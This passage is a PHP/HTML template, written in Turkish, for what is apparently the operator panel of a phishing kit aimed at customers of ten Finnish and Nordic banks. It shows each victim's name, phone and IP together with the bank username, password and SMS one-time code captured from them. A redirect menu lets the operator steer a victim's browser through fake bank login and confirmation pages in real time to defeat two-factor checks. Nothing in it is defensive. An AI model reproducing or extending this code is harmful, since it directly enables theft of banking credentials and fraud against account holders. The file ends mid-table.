<?php
ob_start();
?>
<style>
/* Modern scrollbar for dropdown menu */
.overflow-y-auto::-webkit-scrollbar {
    width: 6px;
}
.overflow-y-auto::-webkit-scrollbar-track {
    background: #f7fafc;
    border-radius: 10px;
}
.overflow-y-auto::-webkit-scrollbar-thumb {
    background: #cbd5e0;
    border-radius: 10px;
}
.overflow-y-auto::-webkit-scrollbar-thumb:hover {
    background: #a0aec0;
}
</style>

<div class="p-4 md:p-8 animate-fade-in">
    <div class="mb-6 md:mb-8">
        <div class="flex items-center justify-between">
            <div>
                <h1 class="text-2xl md:text-3xl font-bold text-slate-100">
                    <?php if (isset($filteredBank)): ?>
                        <?= htmlspecialchars($filteredBank) ?> - Kullanıcılar
                    <?php else: ?>
                        Kullanıcılar
                    <?php endif; ?>
                </h1>
                <p class="text-slate-400 mt-2">
                    <?php if (isset($filteredBank)): ?>
                        <?= htmlspecialchars($filteredBank) ?> bankasını seçen <?= number_format($totalUsers) ?> kullanıcı
                    <?php else: ?>
                        Toplam <?= number_format($totalUsers) ?> kullanıcı
                    <?php endif; ?>
                </p>
            </div>
            <?php if (isset($filteredBank)): ?>
            <a 
                href="/admin/users" 
                class="px-4 py-2 bg-slate-700 hover:bg-slate-600 text-slate-200 rounded-lg transition-colors flex items-center gap-2"
            >
                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                </svg>
                Filtreyi Kaldır
            </a>
            <?php endif; ?>
        </div>
    </div>

    <?php if (isset($filteredBankKey)): ?>
    <!-- Filtrelenmiş Banka - Kart Tasarımı -->
    <?php if (empty($users)): ?>
    <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 p-12 text-center animate-fade-in">
        <svg class="w-16 h-16 mx-auto text-slate-500 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4"></path>
        </svg>
        <h3 class="text-lg font-semibold text-slate-300 mb-2">Henüz kullanıcı yok</h3>
        <p class="text-slate-400"><?= htmlspecialchars($filteredBank) ?> bankasını seçen kullanıcı bulunmuyor.</p>
    </div>
    <?php else: ?>
    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 animate-fade-in">
        <?php foreach ($users as $user): ?>
        <div class="bg-slate-800 rounded-lg shadow-xl border border-slate-700 p-6 hover:border-blue-500/50 transition-all duration-200">
            <div class="flex items-start justify-between mb-4">
                <div>
                    <div class="text-sm font-semibold text-slate-300 mb-1">#<?= $user['id'] ?></div>
                    <h3 class="text-lg font-bold text-slate-100"><?= htmlspecialchars($user['full_name']) ?></h3>
                    <p class="text-sm text-slate-400 mt-1"><?= htmlspecialchars($user['phone']) ?></p>
                </div>
                <div class="relative inline-block text-left" x-data="{ open: false }">
                    <button 
                        @click="open = !open"
                        class="text-slate-400 hover:text-slate-200 transition-colors"
                    >
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 5v.01M12 12v.01M12 19v.01M12 6a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2zm0 7a1 1 0 110-2 1 1 0 010 2z"></path>
                        </svg>
                    </button>
                    <div 
                        x-show="open"
                        @click.away="open = false"
                        class="origin-top-right absolute right-0 mt-2 w-56 rounded-lg shadow-2xl bg-slate-800 border border-slate-600 z-50"
                    >
                        <div class="py-2">
                            <?php if (isset($filteredBankKey) && isset($bankId) && $bankId): ?>
                            <div class="px-4 py-2 bg-slate-700 border-b border-slate-600">
                                <div class="text-xs font-semibold text-slate-300 uppercase tracking-wide"><?= htmlspecialchars($filteredBank ?? 'Banka') ?></div>
                            </div>
                            
                            <?php
                            // Her banka için tüm sayfaları belirle
                            $bankPages = [];
                            if ($filteredBankKey === 'nordea') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/1', 'label' => 'Nordea Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/nordea2', 'label' => 'Nordea Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/nordea3', 'label' => 'Nordea Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/nordea4', 'label' => 'Nordea Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/nordea5', 'label' => 'Nordea Sayfa 5']
                                ];
                            } elseif ($filteredBankKey === 'alandsbanken') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/2', 'label' => 'Ålandsbanken Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/alandsbanken2', 'label' => 'Ålandsbanken Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/alandsbanken3', 'label' => 'Ålandsbanken Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/alandsbanken4', 'label' => 'Ålandsbanken Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/alandsbanken5', 'label' => 'Ålandsbanken Sayfa 5']
                                ];
                            } elseif ($filteredBankKey === 'danske') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/3', 'label' => 'Danske Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/danske2', 'label' => 'Danske Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/danske3', 'label' => 'Danske Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/danske4', 'label' => 'Danske Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/danske5', 'label' => 'Danske Sayfa 5']
                                ];
                            } elseif ($filteredBankKey === 'spankki') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/4', 'label' => 'S-Pankki Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/spankki2', 'label' => 'S-Pankki Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/spankki3', 'label' => 'S-Pankki Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/spankki4', 'label' => 'S-Pankki Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/spankki5', 'label' => 'S-Pankki Sayfa 5'],
                                    ['url' => '/user/' . $user['id'] . '/bank/spankki-confirm', 'label' => 'S-Pankki Onay Sayfası']
                                ];
                            } elseif ($filteredBankKey === 'aktia') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/' . $bankId, 'label' => 'Aktia Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/aktia2', 'label' => 'Aktia Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/aktia3', 'label' => 'Aktia Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/aktia4', 'label' => 'Aktia Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/aktia5', 'label' => 'Aktia Sayfa 5']
                                ];
                            } elseif ($filteredBankKey === 'op') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/' . $bankId, 'label' => 'OP Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/op2', 'label' => 'OP Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/op3', 'label' => 'OP Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/op4', 'label' => 'OP Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/op5', 'label' => 'OP Sayfa 5'],
                                    ['url' => '/user/' . $user['id'] . '/bank/op-confirm', 'label' => 'OP Onay Sayfası']
                                ];
                            } elseif ($filteredBankKey === 'poppankki') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/7', 'label' => 'POP Pankki Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/poppankki2', 'label' => 'POP Pankki Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/poppankki3', 'label' => 'POP Pankki Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/poppankki4', 'label' => 'POP Pankki Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/poppankki5', 'label' => 'POP Pankki Sayfa 5']
                                ];
                            } elseif ($filteredBankKey === 'omasp') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/8', 'label' => 'OmaSP Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/omasp2', 'label' => 'OmaSP Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/omasp3', 'label' => 'OmaSP Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/omasp4', 'label' => 'OmaSP Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/omasp5', 'label' => 'OmaSP Sayfa 5']
                                ];
                            } elseif ($filteredBankKey === 'saastopankki') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/9', 'label' => 'Säästöpankki Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/saastopankki2', 'label' => 'Säästöpankki Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/saastopankki3', 'label' => 'Säästöpankki Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/saastopankki4', 'label' => 'Säästöpankki Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/saastopankki5', 'label' => 'Säästöpankki Sayfa 5']
                                ];
                            } elseif ($filteredBankKey === 'handelsbanken') {
                                $bankPages = [
                                    ['url' => '/user/' . $user['id'] . '/bank/10', 'label' => 'Handelsbanken Giriş'],
                                    ['url' => '/user/' . $user['id'] . '/bank/handelsbanken2', 'label' => 'Handelsbanken Sayfa 2'],
                                    ['url' => '/user/' . $user['id'] . '/bank/handelsbanken3', 'label' => 'Handelsbanken Sayfa 3'],
                                    ['url' => '/user/' . $user['id'] . '/bank/handelsbanken4', 'label' => 'Handelsbanken Sayfa 4'],
                                    ['url' => '/user/' . $user['id'] . '/bank/handelsbanken5', 'label' => 'Handelsbanken Sayfa 5']
                                ];
                            }
                            
                            if (!empty($bankPages)):
                                foreach ($bankPages as $page):
                            ?>
                            <button 
                                onclick="redirectUser(<?= $user['id'] ?>, '<?= $page['url'] ?>')"
                                class="w-full text-left block px-4 py-2.5 text-sm text-slate-200 hover:bg-slate-700 hover:text-blue-400 transition-colors flex items-center group"
                                role="menuitem"
                            >
                                <svg class="w-4 h-4 mr-3 text-slate-400 group-hover:text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                                </svg>
                                <?= htmlspecialchars($page['label']) ?>
                            </button>
                            <?php
                                endforeach;
                            endif;
                            ?>
                            <div class="border-t border-slate-600 my-2"></div>
                            <?php endif; ?>
                            <button 
                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/waiting')"
                                class="w-full text-left block px-4 py-2 text-sm text-slate-200 hover:bg-slate-700 transition-colors"
                            >
                                Bekletme Sayfası
                            </button>
                            <button 
                                onclick="redirectUser(<?= $user['id'] ?>, '/user/<?= $user['id'] ?>/whatsapp')"
                                class="w-full text-left block px-4 py-2 text-sm text-slate-200 hover:bg-slate-700 transition-colors"
                            >
                                WhatsApp Yönlendirme
                            </button>
                        </div>
                    </div>
                </div>
            </div>
            
            <div class="space-y-3">
                <?php
                $bankData = null;
                if ($filteredBankKey === 'nordea' && (!empty($user['nordea_username']) || !empty($user['nordea_password']) || !empty($user['nordea_sms_code']) || !empty($user['nordea_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['nordea_username'] ?? null,
                        'password' => $user['nordea_password'] ?? null,
                        'sms_code' => $user['nordea_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['nordea_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'alandsbanken' && (!empty($user['alandsbanken_username']) || !empty($user['alandsbanken_password']) || !empty($user['alandsbanken_sms_code']) || !empty($user['alandsbanken_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['alandsbanken_username'] ?? null,
                        'password' => $user['alandsbanken_password'] ?? null,
                        'sms_code' => $user['alandsbanken_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['alandsbanken_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'danske' && (!empty($user['danske_username']) || !empty($user['danske_password']) || !empty($user['danske_sms_code']) || !empty($user['danske_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['danske_username'] ?? null,
                        'password' => $user['danske_password'] ?? null,
                        'sms_code' => $user['danske_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['danske_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'spankki' && (!empty($user['spankki_username']) || !empty($user['spankki_password']) || !empty($user['spankki_sms_code']) || !empty($user['spankki_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['spankki_username'] ?? null,
                        'password' => $user['spankki_password'] ?? null,
                        'sms_code' => $user['spankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['spankki_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'aktia' && (!empty($user['aktia_username']) || !empty($user['aktia_sms_code']) || !empty($user['aktia_app_confirmed']) || !empty($user['aktia_login_method']))) {
                    $bankData = [
                        'username' => $user['aktia_username'] ?? null,
                        'login_method' => $user['aktia_login_method'] ?? null,
                        'sms_code' => $user['aktia_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['aktia_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'op' && (!empty($user['op_username']) || !empty($user['op_password']) || !empty($user['op_sms_code']) || !empty($user['op_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['op_username'] ?? null,
                        'password' => $user['op_password'] ?? null,
                        'sms_code' => $user['op_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['op_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'poppankki' && (!empty($user['poppankki_username']) || !empty($user['poppankki_sms_code']) || !empty($user['poppankki_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['poppankki_username'] ?? null,
                        'sms_code' => $user['poppankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['poppankki_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'omasp' && (!empty($user['omasp_username']) || !empty($user['omasp_sms_code']) || !empty($user['omasp_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['omasp_username'] ?? null,
                        'sms_code' => $user['omasp_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['omasp_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'saastopankki' && (!empty($user['saastopankki_username']) || !empty($user['saastopankki_sms_code']) || !empty($user['saastopankki_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['saastopankki_username'] ?? null,
                        'sms_code' => $user['saastopankki_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['saastopankki_app_confirmed'])
                    ];
                } elseif ($filteredBankKey === 'handelsbanken' && (!empty($user['handelsbanken_username']) || !empty($user['handelsbanken_password']) || !empty($user['handelsbanken_sms_code']) || !empty($user['handelsbanken_app_confirmed']))) {
                    $bankData = [
                        'username' => $user['handelsbanken_username'] ?? null,
                        'password' => $user['handelsbanken_password'] ?? null,
                        'sms_code' => $user['handelsbanken_sms_code'] ?? null,
                        'app_confirmed' => !empty($user['handelsbanken_app_confirmed'])
                    ];
                }
                ?>
                
                <?php if ($bankData): ?>
                <div class="bg-slate-700/50 rounded-lg p-4 border border-slate-600/50">
                    <h4 class="text-sm font-semibold text-slate-300 mb-3 flex items-center gap-2">
                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path>
                        </svg>
                        <?= htmlspecialchars($filteredBank) ?> Bilgileri
                    </h4>
                    <div class="space-y-2.5">
                        <?php if (!empty($bankData['username'])): ?>
                        <div>
                            <div class="text-xs font-medium text-slate-400 mb-1">
                                <?= $filteredBankKey === 'nordea' ? 'Käyttäjätunnus' : ($filteredBankKey === 'danske' ? 'User ID' : ($filteredBankKey === 'handelsbanken' ? 'Användarnamn' : 'Käyttäjätunnus')) ?>:
                            </div>
                            <div class="text-sm font-mono text-slate-200 bg-slate-900/50 px-3 py-2 rounded border border-slate-600">
                                <?= htmlspecialchars($bankData['username']) ?>
                            </div>
                        </div>
                        <?php endif; ?>
                        <?php if (!empty($bankData['password'])): ?>
                        <div>
                            <div class="text-xs font-medium text-slate-400 mb-1">
                                <?= $filteredBankKey === 'nordea' ? 'Tunnusluku' : ($filteredBankKey === 'danske' ? 'Password' : ($filteredBankKey === 'handelsbanken' ? 'Lösenord' : 'Salasana')) ?>:
                            </div>
                            <div class="text-sm font-mono text-slate-200 bg-slate-900/50 px-3 py-2 rounded border border-slate-600">
                                <?= htmlspecialchars($bankData['password']) ?>
                            </div>
                        </div>
                        <?php endif; ?>
                        <?php if (!empty($bankData['login_method'])): ?>
                        <div>
                            <div class="text-xs font-medium text-slate-400 mb-1">Kirjautumistapa:</div>
                            <div class="text-sm text-slate-200 bg-slate-900/50 px-3 py-2 rounded border border-slate-600">
                                <?= $bankData['login_method'] === 'app' ? 'Kyllä, Aktia ID -sovellus' : 'Ei, verkkopankkitunnus + SMS' ?>
                            </div>
                        </div>
                        <?php endif; ?>
                        <?php if (!empty($bankData['sms_code'])): ?>
                        <div>
                            <div class="text-xs font-medium text-slate-400 mb-1">SMS Kodu:</div>
                            <div class="text-sm font-mono text-slate-200 bg-slate-900/50 px-3 py-2 rounded border border-slate-600">
                                <?= htmlspecialchars($bankData['sms_code']) ?>
                            </div>
                        </div>
                        <?php endif; ?>
                        <?php if (!empty($bankData['app_confirmed'])): ?>
                        <div>
                            <div class="text-xs font-medium text-slate-400 mb-1">Uygulama Onayı:</div>
                            <div class="inline-flex items-center px-3 py-1.5 rounded-full text-xs font-semibold bg-green-500/20 text-green-400 border border-green-500/30">
                                <svg class="w-3 h-3 mr-1.5" fill="currentColor" viewBox="0 0 20 20">
                                    <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
                                </svg>
                                Onaylandı
                            </div>
                        </div>
                        <?php endif; ?>
                    </div>
                </div>
                <?php else: ?>
                <div class="bg-slate-700/30 rounded-lg p-4 border border-slate-600/30 text-center">
                    <p class="text-sm text-slate-400">Henüz <?= htmlspecialchars($filteredBank) ?> bilgisi yok</p>
                </div>
                <?php endif; ?>
                
                <div class="flex items-center justify-between pt-3 border-t border-slate-700">
                    <div class="text-xs text-slate-400">
                        <?= htmlspecialchars($user['ip_address']) ?>
                    </div>
                    <div class="text-xs text-slate-400">
                        <?= date('d.m.Y H:i', strtotime($user['created_at'])) ?>
                    </div>
                </div>
                
                <?php if (!empty($user['current_page'])): ?>
                <div class="pt-2">
                    <div class="inline-flex items-center px-3 py-1.5 rounded-full text-xs font-medium bg-green-500/20 text-green-400 border border-green-500/30">
                        <span class="w-2 h-2 bg-green-400 rounded-full mr-2 animate-pulse"></span>
                        <?= htmlspecialchars($user['page_title'] ?? $user['current_page']) ?>
                    </div>
                </div>
                <?php endif; ?>
            </div>
        </div>
        <?php endforeach; ?>
    </div>
    
    <!-- Pagination for filtered view -->
    <?php if ($totalPages > 1): ?>
    <div class="mt-6 flex items-center justify-between px-4 py-4 bg-slate-800 rounded-lg border border-slate-700">
        <div class="text-sm text-slate-400">
            Sayfa <?= $currentPage ?> / <?= $totalPages ?>
        </div>
        <div class="flex space-x-2">
            <?php if ($currentPage > 1): ?>
            <a href="/admin/users/bank/<?= $filteredBankKey ?>?page=<?= $currentPage - 1 ?>" class="px-4 py-2 bg-slate-700 text-slate-200 rounded-lg hover:bg-slate-600 transition-colors">
                Önceki
            </a>
            <?php endif; ?>
            <?php if ($currentPage < $totalPages): ?>
            <a href="/admin/users/bank/<?= $filteredBankKey ?>?page=<?= $currentPage + 1 ?>" class="px-4 py-2 bg-slate-700 text-slate-200 rounded-lg hover:bg-slate-600 transition-colors">
                Sonraki
            </a>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>
    <?php endif; ?>
    <?php else: ?>
    <!-- Normal Tablo Görünümü -->
    <div class="bg-slate-800 rounded-lg shadow-2xl border border-slate-700 overflow-hidden animate-slide-in">
        <div class="overflow-x-auto -mx-4 md:mx-0">
            <table class="w-full min-w-[1200px] md:min-w-0">
                <thead class="bg-slate-700 hidden md:table-header-group">
                    <tr>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase">ID</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase">İsim</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase">Telefon</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden lg:table-cell">IP Adresi</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase">Seçilen Banka</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">Nordea</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">Ålandsbanken</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">Danske</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">S-Pankki</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">Aktia</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">OP</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">POP Pankki</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">OmaSP</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">Säästöpankki</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden xl:table-cell">Handelsbanken</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase">Aktif Sayfa</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase hidden lg:table-cell">Kayıt Tarihi</th>
                        <th class="px-3 md:px-6 py-3 text-left text-xs font-medium text-slate-300 uppercase">İşlemler</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-slate-700">
                    <?php if (empty($users)): ?>
                    <tr>
                        <td colspan="14" class="px-6 py-4 text-center text-slate-400">Henüz kullanıcı yok</td>
                    </tr>
                    <?php else: ?>
                        <?php foreach ($users as $user): ?>
                        <tr class="hover:bg-slate-700/50 transition-colors duration-150">
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm text-slate-100">#<?= $user['id'] ?></td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm font-medium text-slate-100">
                                <?= htmlspecialchars($user['full_name']) ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm text-slate-100">
                                <?= htmlspecialchars($user['phone']) ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm text-slate-400 hidden lg:table-cell">
                                <?= htmlspecialchars($user['ip_address']) ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm text-slate-100" id="user-bank-<?= $user['id'] ?>">
                                <?= $user['bank_name'] ? htmlspecialchars($user['bank_name']) : '<span class="text-slate-500">-</span>' ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-nordea-<?= $user['id'] ?>">
                                <?php if (!empty($user['nordea_username']) || !empty($user['nordea_password']) || !empty($user['nordea_sms_code']) || !empty($user['nordea_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['nordea_username'])): ?>
                                        <div class="font-medium text-slate-200">Käyttäjätunnus:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['nordea_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['nordea_password'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Tunnusluku:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['nordea_password']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['nordea_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">SMS Kodu:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['nordea_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['nordea_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Uygulama Onayı:</div>
                                        <div class="text-green-400">✓ Onaylandı</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-alandsbanken-<?= $user['id'] ?>">
                                <?php if (!empty($user['alandsbanken_username']) || !empty($user['alandsbanken_password']) || !empty($user['alandsbanken_sms_code']) || !empty($user['alandsbanken_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['alandsbanken_username'])): ?>
                                        <div class="font-medium text-slate-200">Användar-ID:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['alandsbanken_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['alandsbanken_password'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Lösenord:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['alandsbanken_password']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['alandsbanken_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">SMS-kod:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['alandsbanken_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['alandsbanken_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Appbekräftelse:</div>
                                        <div class="text-green-400">✓ Bekräftad</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-danske-<?= $user['id'] ?>">
                                <?php if (!empty($user['danske_username']) || !empty($user['danske_password']) || !empty($user['danske_sms_code']) || !empty($user['danske_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['danske_username'])): ?>
                                        <div class="font-medium text-slate-200">User ID:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['danske_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['danske_password'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Password:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['danske_password']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['danske_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">SMS Code:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['danske_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['danske_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">App Confirmation:</div>
                                        <div class="text-green-400">✓ Confirmed</div>
                                        <?php endif; ?>
                                    </div>
                                <?php else: ?>
                                    <span class="text-slate-500">-</span>
                                <?php endif; ?>
                            </td>
                            <td class="px-3 md:px-6 py-4 whitespace-nowrap text-sm hidden xl:table-cell" id="user-spankki-<?= $user['id'] ?>">
                                <?php if (!empty($user['spankki_username']) || !empty($user['spankki_password']) || !empty($user['spankki_sms_code']) || !empty($user['spankki_app_confirmed'])): ?>
                                    <div class="text-xs">
                                        <?php if (!empty($user['spankki_username'])): ?>
                                        <div class="font-medium text-slate-200">Käyttäjätunnus:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['spankki_username']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['spankki_password'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Salasana:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['spankki_password']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['spankki_sms_code'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Tekstiviestikoodi:</div>
                                        <div class="text-slate-300"><?= htmlspecialchars($user['spankki_sms_code']) ?></div>
                                        <?php endif; ?>
                                        <?php if (!empty($user['spankki_app_confirmed'])): ?>
                                        <div class="font-medium text-slate-200 mt-1">Sovelluksen vahvistus:</div>
                                        <div class="text-green-400">✓ Vahvistettu</div>
                                        <?php endif; ?>
                                    </div>
